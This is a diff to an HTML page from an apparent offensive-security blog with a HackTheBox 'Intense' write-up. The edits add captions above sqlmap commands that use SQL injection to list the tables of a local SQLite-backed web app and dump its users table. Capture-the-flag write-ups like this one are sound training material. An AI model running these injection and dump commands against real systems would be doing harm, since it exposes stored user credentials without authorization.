@@ -40,7 +40,7 @@
             <div class="header">
     <h1>Offsec notes</h1>
     <br>
-    <h5><i>Web and Active Directory stuff</i></h5>
+    <h5><i>Web, Active Directory and Maldev stuff</i></h5>
     <br>
     <nav>
     
@@ -65,7 +65,7 @@
 <div class="post-content">
 <h2 id="context">Context</h2>
 
-<p>Back to year 2019, my first HackTheBox box <code class="language-plaintext highlighter-rouge">Intense</code> was released with several steps involved:</p>
+<p>Back to 2019, my first HackTheBox box <code class="language-plaintext highlighter-rouge">Intense</code> was released with several steps involved:</p>
 <ul>
   <li>exploit a SQL injection for SQLite DMBS on the web application</li>
   <li>use a hash length extension attack to login as admin on the web application</li>
@@ -373,6 +373,7 @@ Parameter: message <span class="o">(</span>POST<span class="o">)</span>
 
 <p><br /></p>
 
+<p>Dump the tables:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite <span class="nt">--tables</span>
 
 <span class="o">[</span>...]
@@ -403,6 +404,9 @@ back-end DBMS: SQLite
 +----------+
 </code></pre></div></div>
 
+<p><br /></p>
+
+<p>Dump data from the <code class="language-plaintext highlighter-rouge">users</code> table:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>
 
 <span class="o">[</span>...]
@@ -451,7 +455,7 @@ Table: <span class="nb">users</span>
         <div class="footer">
     <span class="footer-text float-left">This work is licensed under <a rel="license" href="https://www.gnu.org/licenses/gpl-3.0.en.html" target="_blank">GPLv3</a></span>
     <span class="footer-text float-right">
-    Site Updated: 2023-08-24  (<a href="/feed.xml" target="_blank">RSS</a>)
+    Site Updated: 2023-08-25  (<a href="/feed.xml" target="_blank">RSS</a>)
   </span>
 </div>
     </footer>
